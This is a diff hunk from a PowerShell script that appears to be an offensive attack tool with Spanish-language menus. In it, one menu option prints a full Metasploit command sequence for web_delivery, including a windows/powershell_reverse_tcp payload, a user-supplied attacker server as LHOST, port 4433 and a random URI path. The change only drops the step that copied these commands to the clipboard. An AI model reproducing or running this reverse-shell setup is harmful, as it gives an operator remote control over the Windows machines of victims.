@@ -394,10 +394,10 @@ if($Language -in 'Spanish') {
         if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
 	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
 	Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; { Write-host "use exploit/multi/script/web_delivery"
+	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
 	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 80" ; Write-host "set SSL false" ; Write-host "set target 2"
         Write-host "set payload windows/powershell_reverse_tcp" ; Write-host "set LHOST $metaserver"
-	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit -j" } | Set-Clipboard ; Get-Clipboard 
+	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit -j"
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
